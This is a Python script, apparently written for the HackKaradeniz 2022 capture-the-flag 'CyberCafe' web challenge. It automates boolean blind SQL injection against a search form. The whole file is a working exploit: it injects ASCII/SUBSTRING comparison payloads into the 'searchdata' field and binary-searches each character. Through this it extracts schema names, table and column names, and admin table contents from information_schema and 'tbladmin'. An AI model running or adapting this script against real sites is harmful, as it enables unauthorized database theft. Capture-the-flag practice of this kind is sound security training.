# HackKaradeniz 2022 WEB:CyberCafe Boolean Blind SQLi Script
# Yazar: Şefik Efe Altınoluk
# Writeup için: https://github.com/HackKaradeniz22-CyberCafe

import requests

def setVars(): # Function to update variables before moving on each new character in binary search algorithm.
    global value, upperlimit, lowerlimit, operator
    value = 102
    upperlimit = 176
    lowerlimit = 31
    operator = ">"

def setPayload(): # Function to update variables before each http request.
    global payload, cookie
    payload = f"' AND ASCII(SUBSTRING(({query} LIMIT {row},1), {charNum}, 1)) {operator} {value}#" # SQLi payload for comparison
    data.update({"searchdata":"285255862" + payload})


setVars()
#query = "SELECT DATABASE() FROM DUAL"
#query = "SELECT schema_name FROM information_schema.schemata"
#query = "SELECT table_name FROM information_schema.tables where table_schema=database()"
#query = "SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='tbladmin'"
query = "SELECT AdminRegdate FROM tbladmin"

url = "https://challenge105.hackkaradeniz.xyz/k1j2uzn2q00b/search.php"
data = {"searchdata":"285255862", "search":""}
cookie = {"PHPSESSID":"6nvhrg3e3mp42emt74qc1sugpi"}

pattern = "Shanu Dev"
row = 0
charNum = 1
word = list()
result = list()

while True:
    setPayload()
    r = requests.post(url, data=data, cookies=cookie)
    if r.status_code == 200:
        #print(r.request.body)
        if pattern in r.text:
            lowerlimit = value
            value = (value+upperlimit)/2
            if (upperlimit-value) <= 1: # 99% that the rounded value of one of two is the correct value we're looking for.
                operator = "="
                possibleValue1 = round(upperlimit)
                possibleValue2 = round(value)

                value = possibleValue1
                setPayload()

                r = requests.post(url, data=data, cookies=cookie)

                if r.status_code == 200 and pattern in r.text:
                    char = chr(value)
                    print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                    charNum += 1    # Settings to dump the next character of the current row
                    setVars()
                elif r.status_code == 200 and pattern not in r.text:
                    value = possibleValue2
                    setPayload()
                    r = requests.post(url, data=data, cookies=cookie)
                    if pattern in r.text:
                        char = chr(value)
                        print(f"[+] {charNum}. character of {row+1}. row has been dumped: {char}")
                        charNum += 1    # Settings to dump the next character of the current row
                        setVars()
                    else:
                        print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                        exit(1)
                else:
                    print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
                    exit(1)

                word.append(char)
                print(f"[+] Word ==> {''.join(word)}\n")

        elif pattern not in r.text:     # Binary search algorithm for characters between current value and lower limit
            upperlimit = value
            value = (lowerlimit+value)/2
            if (value-31) <= 1:             # No undumped character left in the current row, continue dumping the next row returned by query.
                result.append(''.join(word))
                if result[len(result)-1] == '':
                    print("This query has no more rows returned!")
                    exit()
                result.append("\n") # Add a newline character in order to make different lines seperated from each other when the list is converted to string.
                print(f"[*] Dumped data so far:\n{''.join(result)}")
                word.clear()    # Settings to dump the next row of the rows returned by query
                row += 1
                charNum = 1
                setVars()
    else:
            print("\n[-] An error occured, HTTP response status: " + str(r.status_code))
            exit(1)
